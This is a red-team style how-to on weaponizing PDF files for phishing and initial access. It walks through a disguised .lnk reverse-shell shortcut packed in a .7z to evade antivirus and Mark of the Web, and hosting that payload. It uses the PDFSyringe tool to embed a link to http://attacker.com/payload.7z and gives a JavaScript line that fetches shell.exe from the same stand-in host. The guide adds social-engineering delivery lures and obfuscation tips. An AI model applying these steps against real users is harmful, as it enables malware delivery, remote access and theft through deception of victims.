# Malicious PDF (Portable Document Format)

**Type:** Malicious Documents & File-Based Delivery  
**Platform:** Windows, macOS, Linux (PDF Reader or browser-dependent)  
**Prerequisites:** User must open the PDF file in a vulnerable or misconfigured PDF reader (e.g., Adobe Reader with JavaScript enabled) for Code Execution



---
## Overview

Malicious PDF files are widely used in phishing campaigns and red team operations for initial access. PDFs can embed **JavaScript, launch actions, file attachments, and even execute external programs** in some cases.

Attackers exploit **JavaScript execution**, **action triggers**, and **vulnerabilities** in PDF viewers (e.g., Adobe Reader [CVE-2010-1240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-1240), [CVE-2018-4990](https://nvd.nist.gov/vuln/detail/CVE-2018-4990),  [CVE-2023-26369](https://nvd.nist.gov/vuln/detail/cve-2023-26369), [CVE-2024-41869](https://nvd.nist.gov/vuln/detail/cve-2024-41869) ) to:
- Drop/Execute malware
- Execute commands (via vulnerable Adobe Acrobat Reader : [CVE-2010-1240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-1240), [CVE-2018-4990](https://nvd.nist.gov/vuln/detail/CVE-2018-4990),  [CVE-2023-26369](https://nvd.nist.gov/vuln/detail/cve-2023-26369), [CVE-2024-41869](https://nvd.nist.gov/vuln/detail/cve-2024-41869))
- Credential harvesting ( via JavaScript/Forms )



---
## How It Works

1. The attacker creates a malicious PDF file.
2. The PDF includes either :
   - JavaScript code ( to drop malware or phish for credentials )
   - exploit trigger (e.g :  Adobe Acrobat  : [CVE-2010-1240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-1240), [CVE-2018-4990](https://nvd.nist.gov/vuln/detail/CVE-2018-4990),  [CVE-2023-26369](https://nvd.nist.gov/vuln/detail/cve-2023-26369), [CVE-2024-41869](https://nvd.nist.gov/vuln/detail/cve-2024-41869))
3. When the user opens the file, the embedded code is executed **automatically** or **after user interaction**, depending on the PDF reader's configuration.

Some PDF exploits do not require user interaction and trigger **on open**.


---
## Prerequisites

**Tools Needed**
- `msfvenom` or other payload generator (optional)
- pdf editor or a tool to generate a malicious pdf file e.g : `PDFSyringe`  or `EvilPDF`
- `msfconsole` or `nc`  (for listening)


---
## Steps to Implement

>in most cases we will use PDFs to drop malware or harvest credentials ( with social engineering ), so i'll demonstrate how to leverage PDFs to drop malware on the target system ( and convince the victim to open the dropped malware )

1. **Create Payload (Reverse Shell)**

we'll create a shortcut ( .lnk ) that execute our reverse shell and make it looks like a benign document , then we'll compress it into a `.7z`  archive ( to evade av and evade windows Mark of the Web ).

so at the end we will have a 7-zip archive that contain our shortcut file and a pdf file to display to the victim ( to avoid raising suspicion ) 

2. **host the payload** 

use python to host the payload ( zip archive )
```shell
python -m http.server 80
```

3. **Embed a URI to the remote payload** 

Use `PDFSyringe` to make a pdf file that has a clickable link to the payload 

```bash
git clone https://github.com/o-sec/PDFSyringe

cd PDFSyringe

chmod +x pdfsyringe.py 

./pdfsyringe.py -u http://attacker.com/payload.7z -t template.pdf -o document1.pdf
```

This generates a malicious pdf file with the embedded clickable URI to the payload.

4. **Deliver the PDF**

- Send via email attachment with a social engineering lure
- Host on a web server (e.g., http://attacker.com/invoice.pdf)

5. **Execution**

when the victim opens the PDF file will potentially fall for the social engineering lure and download the 7zip archive and extract it then hopefully open the stage2 payload, then we'll get a reverse shell :)

at the end of the day it depends on social engineering. but in some cases we could exploit vulnerabilities in pdf readers like : [CVE-2010-1240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-1240), [CVE-2018-4990](https://nvd.nist.gov/vuln/detail/CVE-2018-4990),  [CVE-2023-26369](https://nvd.nist.gov/vuln/detail/cve-2023-26369), [CVE-2024-41869](https://nvd.nist.gov/vuln/detail/cve-2024-41869)



---
## Payload/Code Snippets

- **JavaScript Trigger Inside PDF**
```js
app.launchURL("http://attacker.com/shell.exe", true);
```

- **alert with javascript** 
```js
app.alert("hello !");
```



---
## Tips

- Rename the PDF to something enticing: Invoice_351.pdf
- Use password-protected ZIP to deliver the PDF if AV blocks it
- PDF readers vary in behavior, test on Adobe Reader and browser PDF viewers
- Use obfuscated JavaScript for stealth



---
## References

- [PDFSyringe](https://github.com/o-sec/PDFSyringe)
- [CVE-2010-1297](https://nvd.nist.gov/vuln/detail/cve-2010-1297)
- [EvilPDF GitHub](https://github.com/superzerosec/evilpdf)
- [Threat-Loaded: Malicious PDFs Never Go Out of Style](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/threat-loaded-malicious-pdfs-never-go-out-of-style/)
- [CVE-2010-1240: Adobe Reader and Acrobat arbitrary code execution](https://github.com/asepsaepdin/CVE-2010-1240)
- [PDF Malware Is Not Yet Dead](https://threatresearch.ext.hp.com/pdf-malware-is-not-yet-dead/)
- [CVE-2023-26369: Adobe Acrobat PDF Reader RCE when processing TTF fonts](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2023/CVE-2023-26369.html)
- [Beware of weaponized PDF](https://www.sonicwall.com/blog/beware-of-weaponized-pdf)
- [Rise in Deceptive PDF: The Gateway to Malicious Payloads](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-in-deceptive-pdf-the-gateway-to-malicious-payloads/)
- [Can a PDF File be Malware? @john-hammond YOUTUBE](https://www.youtube.com/watch?v=TP4n8fBl6DA&t=415s&pp=ygUYYWRvYmUgcmVhZGVyIHBkZiBleHBsb2l0 "Can a PDF File be Malware?")
- [The Weaponization of PDFs](https://blog.checkpoint.com/research/the-weaponization-of-pdfs-68-of-cyberattacks-begin-in-your-inbox-with-22-of-these-hiding-in-pdfs/)

---

**_Author_** : **o-sec**
